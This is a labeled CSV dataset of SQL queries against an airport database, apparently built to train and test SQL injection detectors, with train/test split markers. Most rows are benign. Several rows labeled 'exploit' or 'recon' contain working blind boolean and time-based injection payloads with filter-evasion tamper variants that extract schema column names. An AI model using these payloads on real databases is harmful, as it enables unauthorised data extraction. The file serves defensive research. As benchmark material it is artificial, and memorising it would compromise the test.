"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""WA81, Fishermans Bay/LPS Seaplane Base"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""1MI1"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""BG2"", ""%"");",0,"WA81, Fishermans Bay/LPS Seaplane Base 1MI1 BG2",,,,select,airport-S17,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Janos;""",0,Janos,,,,select,airport-S21,,,test
"DELETE FROM airport WHERE name LIKE ""Pico Etéreo Airport"" OR keywords LIKE ""Camp Ashoro. JGSDF"";  ",0,Pico Etéreo Airport Camp Ashoro. JGSDF,,,,delete,airport-D3,,,test
"SELECT * FROM airport WHERE gps_code = ""MU85"" OR local_code = ""RS0217""",0,MU85 RS0217,,,,select,airport-S4,,,test
"SELECT id FROM airports WHERE longitude BETWEEN -88.344737 AND -53.258389 AND scheduled_service LIKE ""no""",0,-88.344737 -53.258389 no,,,,select,airport-S23,,,test
USE sys,0,,,,,admin,airport-admin1,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""WZ59"") OR name LIKE ""Keravat, Karavat, Tavelo, Tavilo""",0,"WZ59 Keravat, Karavat, Tavelo, Tavilo",,,,select,airport-S10,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""JP"") OR a.elevation_ft > 3760.0",0,JP 3760.0,,,,select,airport-S11,,,train
"DELETE FROM navaids WHERE ident = ""VRA"";",0,VRA,,,,delete,airport-D6,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""AU""",0,AU,,,,select,airport-S9,,,test
"DELETE FROM airport_frequencies WHERE type = ""Safety Comm"";",0,Safety Comm,,,,delete,airport-D4,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""GYA"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""SJCF, SIIX"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""RJ6YZ"", ""%"");",0,"GYA SJCF, SIIX RJ6YZ",,,,select,airport-S17,,,test
"DELETE FROM airport_frequencies WHERE type = ""A/D"";",0,A/D,,,,delete,airport-D4,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Békéscsaba (city)"";",0,Békéscsaba (city),,,,select,airport-S15,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""RU""",0,RU,,,,select,airport-S9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BH"" GROUP BY r.name ORDER BY r.name ASC;",0,BH,,,,select,airport-S5,,,test
"DELETE FROM regions WHERE name = ""Mamou Region"";",0,Mamou Region,,,,delete,airport-D8,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Mary Immaculate Hospital Heliport"");",0,Mary Immaculate Hospital Heliport,,,,select,airport-S12,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 10,1),11,1))>114,6563) AND ""SD"" LIKE ""SD"", ""Tanzania"", ""EU"", ""Airports in Sint Maarten"")",1," SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 10,1),11,1))>114,6563) AND ""SD"" LIKE ""SD Tanzania EU Airports in Sint Maarten ",exploit,equaltolike,success,insert,airport-I6,boolean-30,boolean,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1837.0 AND 775.0",0,1837.0 775.0,,,,select,airport-S2,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""SPPM, SPPM"") OR name LIKE ""Matsuwa, Cape Tagan, USEK""",0,"SPPM, SPPM Matsuwa, Cape Tagan, USEK",,,,select,airport-S10,,,test
SELECT * FROM airport WHERE icao_code = 'SBGO';,0,SBGO,,,,select,airport-S1,,,test
"GRANT SELECT,INSERT,DELETE,UPDATE ON users.* TO 'ec2-user'@'localhost';",0,,,,,admin,airport-admin9,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Tarry Bank Airport"") and 8191=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 11,1),10,1))>93) then 8191 else (select 7920 union select 3426) end))-- -"");",1," Tarry Bank Airport"") and 8191=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 11,1),10,1))>93) then 8191 else (select 7920 union select 3426) end))-- - ",exploit,lowercase,success,select,airport-S12,boolean-222,boolean,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 324.0",0,US 324.0,,,,select,airport-S11,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Niagara Falls International Airport"");",0,Niagara Falls International Airport,,,,select,airport-S12,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('PL-0167','JP-2261','ZA-0012','SI6Q');",0,PL-0167 JP-2261 ZA-0012 SI6Q,,,,update,airport-U10,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Beachwood;""",0,Beachwood,,,,select,airport-S21,,,test
"SELECT id FROM airports WHERE name LIKE ""%Gq3P8oFfOcUeffQAQo7l%"" OR name LIKE ""%qKSMzB0MXitG33yY3rAS%"" AND type LIKE ""small_airport"" AND scheduled_service LIKE ""no"" AND continent = ""SA"" AND latitude >= -36.889999 AND longitude <= -1.643611",0,Gq3P8oFfOcUeffQAQo7l qKSMzB0MXitG33yY3rAS small_airport no SA -36.889999 -1.643611,,,,select,airport-S23,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""BT-34"", ""07"", ""Zaporizhia Oblast"", ""EU"", ""LB"")",0,BT-34 07 Zaporizhia Oblast EU LB,,,,insert,airport-I5,,,train
SELECT * FROM airport WHERE icao_code = 'UKFP';,0,UKFP,,,,select,airport-S1,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Machmell Airport"");",0,Machmell Airport,,,,select,airport-S12,,,test
"INSERT INTO countries (code, name, continent) VALUES (""LV"", ""Mozambique"", ""AF"")",0,LV Mozambique AF,,,,insert,airport-I7,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""XS73"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Burdur Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Siam, Siamese"", ""%"");",0,"XS73 Airports in Burdur Province Siam, Siamese",,,,select,airport-S18,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""US-ND""",0,EU US-ND,,,,select,airport-S8,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Circle Bar Ranch Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Circle Bar Ranch Airport,,,,select,airport-S14,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""DE""",0,DE,,,,select,airport-S9,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""JP-1484"";",0,JP-1484,,,,select,airport-S7,,,test
"DELETE FROM navaids WHERE ident = ""THS"";",0,THS,,,,delete,airport-D6,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""IT"") OR a.elevation_ft > 507.0",0,IT 507.0,,,,select,airport-S11,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 560.0 AND 929.0",0,560.0 929.0,,,,select,airport-S2,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""SA"" GROUP BY r.name ORDER BY r.name ASC;",0,SA,,,,select,airport-S16,,,test
"SELECT * FROM airport WHERE continent = ""AF"" AND iso_region LIKE ""US-NY""",0,AF US-NY,,,,select,airport-S8,,,train
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 120.5 AND  119.7  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  119.025  AND  122.8  ORDER BY frequency;",0,120.5 119.7 119.025 122.8,,,,select,airport-S13,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GE"" GROUP BY r.name ORDER BY r.name ASC;",0,GE,,,,select,airport-S16,,,test
"UPDATE airport SET name = ""Adisumarmo Airport"" WHERE ident = ""80TE""",0,Adisumarmo Airport 80TE,,,,update,airport-U1,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""4XA2"";",0,4XA2,,,,select,airport-S7,,,test
"SELECT * FROM airport WHERE gps_code = ""YMHT"" OR local_code = ""NM29""",0,YMHT NM29,,,,select,airport-S4,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""LV"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,LV 4,,,,select,airport-S19,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Clifford Field"");",0,Clifford Field,,,,select,airport-S12,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""UM"" GROUP BY r.name ORDER BY r.name ASC;",0,UM,,,,select,airport-S16,,,train
SELECT * FROM airport WHERE icao_code = 'VYPY';,0,VYPY,,,,select,airport-S1,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""SE-Q""",0,SA SE-Q,,,,select,airport-S8,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('UA-0129','US-2541','US-7294','FR-0003');",0,UA-0129 US-2541 US-7294 FR-0003,,,,update,airport-U10,,,test
"DELETE FROM regions WHERE name = ""South Region"" AND 1924 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),5,1))>96) THEN 1924 ELSE (SELECT 3262 UNION SELECT 3700) END))-- -"";",1," South Region"" AND 1924 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 16,1),5,1))>96) THEN 1924 ELSE (SELECT 3262 UNION SELECT 3700) END))-- - ",exploit,equaltolike,success,delete,airport-D8,boolean-150,boolean,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""AR""",0,AR,,,,select,airport-S9,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""MM17, La Retama Southwest"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Dedza District"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in San Marino"", ""%"");",0,"MM17, La Retama Southwest Airports in Dedza District Airports in San Marino",,,,select,airport-S18,,,test
"DELETE FROM airport_frequencies WHERE type = ""TWR"";",0,TWR,,,,delete,airport-D4,,,test
SELECT * FROM airport WHERE icao_code = 'EGLC';,0,EGLC,,,,select,airport-S1,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (26130, ""5TE1"", 4300.0, ""grass"", 0, 0)",0,26130 5TE1 4300.0 grass 0 0,,,,insert,airport-I9,,,test
"SELECT id FROM airports WHERE latitude >= 40.827202 AND continent = ""SA"" AND type LIKE ""heliport"" AND scheduled_service = ""no"" AND elevation_feet >= 72.0",0,40.827202 SA heliport no 72.0,,,,select,airport-S23,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.7 AND  126.2  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  121.2  AND  122.9  ORDER BY frequency;",0,122.7 126.2 121.2 122.9,,,,select,airport-S13,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 125.9 AND  127.7  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  127.575  AND  118.4  ORDER BY frequency;",0,125.9 127.7 127.575 118.4,,,,select,airport-S13,,,test
"SELECT * FROM airport WHERE gps_code = ""YAMT"" OR local_code = ""50F""",0,YAMT 50F,,,,select,airport-S4,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Tarry Bank Airport"") and 1788=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 13,1),1,1))>64) then 1788 else (select 4498 union select 1354) end))-- -"");",1," Tarry Bank Airport"") and 1788=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 13,1),1,1))>64) then 1788 else (select 4498 union select 1354) end))-- - ",exploit,lowercase,success,select,airport-S12,boolean-222,boolean,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""MI36"") OR name LIKE ""MCH, SEMH""",0,"MI36 MCH, SEMH",,,,select,airport-S10,,,test
SELECT id FROM airports WHERE longitude <= -83.072998 AND elevation_feet >= 2083.0,0,-83.072998 2083.0,,,,select,airport-S23,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-4517"";",0,US-4517,,,,select,airport-S7,,,train
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES ((select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 4,1),10,1))>112) then 23192 else (select 7026 union select 4189) end)), ""LKMO"", 2290.0, ""ASPH-P"", 1, 0)",1," (select (case when (ord(mid((select ifnull(cast(column_name as nchar ,0x20  from INFORMATION_SCHEMA.columns where table_name=0x616972706f7274 and table_schema=0x64617461736574 limit 4,1 ,10,1  >112  then 23192 else (select 7026 union select 4189  end   LKMO 2290.0 ASPH-P 1 0 ",exploit,lowercase,success,insert,airport-I9,boolean-48,boolean,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Locher Field"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Locher Field,,,,select,airport-S14,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Castello di Annone (AT);""",0,Castello di Annone (AT),,,,select,airport-S21,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Ungheni District"";",0,Ungheni District,,,,select,airport-S15,,,test
"UPDATE regions SET keywords = ""Airports in Krasnoyarsk Krai"" WHERE iso_country = ""GE"";",0,Airports in Krasnoyarsk Krai GE,,,,update,airport-U9,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""CM"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,CM 2,,,,select,airport-S19,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 89.0 AND 1923.0",0,89.0 1923.0,,,,select,airport-S2,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 761.0 AND 92.0",0,761.0 92.0,,,,select,airport-S2,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""ВПП Ястребино"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""NY4"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""SD79"", ""%"");",0,ВПП Ястребино NY4 SD79,,,,select,airport-S17,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""LT"" OR c.name LIKE CONCAT(""%"", ""Pitcairn"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,LT Pitcairn 3,,,,select,airport-S20,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Dothan Municipal Airport""",0,Dothan Municipal Airport,,,,select,airport-S3,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""NL-GE"", ""Kyiv (city)"", ""AS"", ""MA"", ""https://en.wikipedia.org/wiki/T%C3%A1chira"", ""Airports in Pibor"")",0,NL-GE Kyiv (city) AS MA https://en.wikipedia.org/wiki/T%C3%A1chira Airports in Pibor,,,,insert,airport-I4,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""3695"" AS SIGNED) AND a.iso_country = ""ML"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,3695 ML,,,,select,airport-S22,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Farley Farm Airstrip"");",0,Farley Farm Airstrip,,,,select,airport-S12,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""KM"" OR c.name LIKE CONCAT(""%"", ""Rwanda"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",0,KM Rwanda 4,,,,select,airport-S20,,,test
"SELECT * FROM airport WHERE gps_code = ""SWAK"" OR local_code = ""MT0035""",0,SWAK MT0035,,,,select,airport-S4,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Mid Atlantic Soaring Center Airport""",0,Mid Atlantic Soaring Center Airport,,,,select,airport-S3,,,train
"SELECT id FROM airports WHERE type = ""heliport"" AND longitude <= 0.193333 AND ( FIND_IN_SET(""kTXeb5xEKaNOWHQC2pby"", keywords_field) > 0 OR FIND_IN_SET(""cFUspHcQkw3dhYbW9HS4"", keywords_field) > 0) AND name LIKE ""%tDJsgSZq0WdKKqp99sFR%"" OR name LIKE ""%i4R7l8kb9FtvH2spQs8i%"" AND scheduled_service = ""yes"" AND latitude BETWEEN 48.617901 AND 40.121545 AND elevation_feet >= 352.0",0,heliport 0.193333 kTXeb5xEKaNOWHQC2pby cFUspHcQkw3dhYbW9HS4 tDJsgSZq0WdKKqp99sFR i4R7l8kb9FtvH2spQs8i yes 48.617901 40.121545 352.0,,,,select,airport-S23,,,test
"DELETE FROM airport WHERE name = ""Rancho Grande Airport"";  ",0,Rancho Grande Airport,,,,delete,airport-D2,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Campo Volo Balbido, Santa Giustina"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Zondoma Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in United States Minor Outlying Islands"", ""%"");",0,"Campo Volo Balbido, Santa Giustina Airports in Zondoma Province Airports in United States Minor Outlying Islands",,,,select,airport-S18,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""World Drive Emergency Landing Strip""",0,World Drive Emergency Landing Strip,,,,select,airport-S3,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""De Soto Parish Airport"") AND 7840=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 16,1),4,1))>100) THEN 7840 ELSE (SELECT 4658 UNION SELECT 2438) END))-- -"") OR name LIKE ""De Soto Parish Airport"") AND 7840=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 16,1),4,1))>100) THEN 7840 ELSE (SELECT 4658 UNION SELECT 2438) END))-- -""",1," De Soto Parish Airport ) AND 7840=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 16,1),4,1))>100) THEN 7840 ELSE (SELECT 4658 UNION SELECT 2438) END))-- - De Soto Parish Airport ) AND 7840=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 16,1),4,1))>100) THEN 7840 ELSE (SELECT 4658 UNION SELECT 2438) END))-- - ",exploit,sleep2getlock,success,select,airport-S10,boolean-210,boolean,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('US-2458','EDVX','US-3726','CA-0260');",0,US-2458 EDVX US-3726 CA-0260,,,,update,airport-U10,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (90003, ""CH"", ""Beograd"", ""NDB%'	OR	3089=(SELECT
COUNT(*)�FROM	INFORMATION_SCHEMA.COLUMNSA,INFORMATION_SCHEMA.COLUMNS	B,�INFORMATION_SCHEMA.COLUMNSC	WHERE0	XOR1)#"", 113300, ""MY"")",1," 90003 CH"" Beograd"" NDB%'	OR	3089=(SELECT
COUNT(*)�FROM	INFORMATION_SCHEMA.COLUMNSA,INFORMATION_SCHEMA.COLUMNS	B,�INFORMATION_SCHEMA.COLUMNSC	WHERE0	XOR1)# 113300 MY ",recon,space2mysqlblank,success,insert,airport-I10,time-58,time,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Axel Towers Apartment"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Niari Department"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Soviet, Sovietskaya, Sovetskaya, Аэропорты России"", ""%"");",0,"Axel Towers Apartment Airports in Niari Department Soviet, Sovietskaya, Sovetskaya, Аэропорты России",,,,select,airport-S18,,,train
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Funny Farm Airport""",0,Funny Farm Airport,,,,select,airport-S3,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BD""/**/AND/**/EXTRACTVALUE(8018,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x726567696f6e73/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/6,1),10,1))>96)/**/THEN/**/8018/**/ELSE/**/0x3A/**/END)/**/AND/**/""uRGA""=""uRGA"" OR c.name LIKE CONCAT(""%"", ""Serbia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",1," BD""/**/AND/**/EXTRACTVALUE(8018,CASE/**/WHEN/**/(ORD(MID((SELECT/**/IFNULL(CAST(column_name/**/AS/**/NCHAR),0x20)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/table_name=0x726567696f6e73/**/AND/**/table_schema=0x64617461736574/**/LIMIT/**/6,1),10,1))>96)/**/THEN/**/8018/**/ELSE/**/0x3A/**/END)/**/AND/**/""uRGA""=""uRGA Serbia 2 ",exploit,space2comment,success,select,airport-S20,boolean-252,boolean,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BD"" GROUP BY r.name ORDER BY r.name ASC;",0,BD,,,,select,airport-S5,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (48670, 1654, ""KTVR"", ""TWR"", ""KNOXVILLE TWR"", 120.0)",0,48670 1654 KTVR TWR KNOXVILLE TWR 120.0,,,,insert,airport-I8,,,test
